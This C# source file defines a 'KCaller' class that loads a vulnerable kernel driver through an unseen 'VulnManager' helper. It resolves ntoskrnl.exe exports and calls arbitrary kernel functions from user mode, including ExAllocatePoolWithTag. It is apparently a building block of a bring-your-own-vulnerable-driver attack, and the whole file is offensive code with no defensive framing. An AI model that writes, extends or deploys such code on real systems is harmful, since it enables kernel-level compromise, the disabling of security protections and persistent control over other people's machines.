using System;
using System.Collections.Concurrent;
using System.Runtime.CompilerServices;

using KernelAddress = System.UInt64;

public sealed class KCaller : IDisposable
{
    private readonly VulnManager _vuln;
    private readonly ConcurrentDictionary<string, KernelAddress> _exportCache = new();
    private readonly KernelAddress _ntosBase;
    private bool _disposed;

    public KCaller()
    {
        _vuln = VulnManager.EasyCreate()
            ?? throw new InvalidOperationException("Failed to initialize: Could not load the vulnerable driver (VulnManager).");

        _ntosBase = VulnManager.GetKernelModuleAddress("ntoskrnl.exe");
        if (_ntosBase == 0)
            throw new InvalidOperationException("Failed to initialize: Could not resolve the base address of ntoskrnl.exe.");
    }

    private KernelAddress GetExportAddress(string exportName)
    {
        if (_disposed) throw new ObjectDisposedException(nameof(KCaller));
        if (string.IsNullOrWhiteSpace(exportName))
            throw new ArgumentNullException(nameof(exportName));

        return _exportCache.GetOrAdd(exportName, name =>
        {
            KernelAddress addr = _vuln.GetKernelModuleExport(_ntosBase, name);
            if (addr == 0)
                throw new InvalidOperationException($"Failed to resolve kernel export: '{name}'. Address not found in ntoskrnl.exe.");
            return addr;
        });
    }

    public KernelAddress CallExport(string exportName, params KernelAddress[] args)
    {
        KernelAddress addr = GetExportAddress(exportName);
        KernelAddress ret = 0;

        if (!_vuln.CallKernelFunction(addr, out ret, args))
        {
            throw new InvalidOperationException($"Kernel function call failed: '{exportName}' at address 0x{addr:X}.");
        }

        return ret;
    }

    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    public KernelAddress ExAllocatePoolWithTag(
        KernelAddress poolType,
        KernelAddress size,
        uint tag)
    {
        return CallExport("ExAllocatePoolWithTag", poolType, size, (KernelAddress)tag);
    }

    public VulnManager Vuln
    {
        get
        {
            if (_disposed)
                throw new ObjectDisposedException(nameof(KCaller));

            return _vuln;
        }
    }

    public void Dispose()
    {
        if (!_disposed)
        {
            _vuln?.Dispose();
            _disposed = true;
            GC.SuppressFinalize(this);
        }
    }
}